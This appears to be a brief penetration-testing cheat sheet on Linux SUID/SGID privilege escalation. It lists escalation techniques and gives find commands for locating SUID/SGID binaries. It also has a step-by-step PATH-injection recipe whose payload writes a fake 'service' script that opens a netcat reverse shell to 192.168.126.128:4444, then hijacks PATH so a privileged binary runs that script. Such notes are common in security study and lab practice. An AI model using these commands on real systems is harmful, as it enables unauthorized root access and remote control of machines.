
###### 4 Major techniques for SUID and SGID escalation
```
1. Use of "Intended functionality"
2. SHELL ESCAPING
3. Path Variable Injection
4. Shared Object Overtake 
```



###### Find all the SUID/SGID executables on the system
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

```
find / -type f -perm -4000 2>/dev/null
```

```
find / -type f -perm -u=s 2>/dev/null
```





###### Path Injection:
Step 1: Write a payload and save that inside a file
```
echo -e '#!/bin/sh\nnc 192.168.126.128 4444 -e /bin/sh' > service
```

Step 2: Give file executable permission 
```
chmod +x service
```

Step 3: Move file inside temp directory
```
mv service /tmp
```

Step 4: Add file path inside path variable 
```
PATH=/tmp:$PATH
```





Find shared library 
```
strace /usr/bin/<command>     ex: ls, nmap, file_anem.so
```


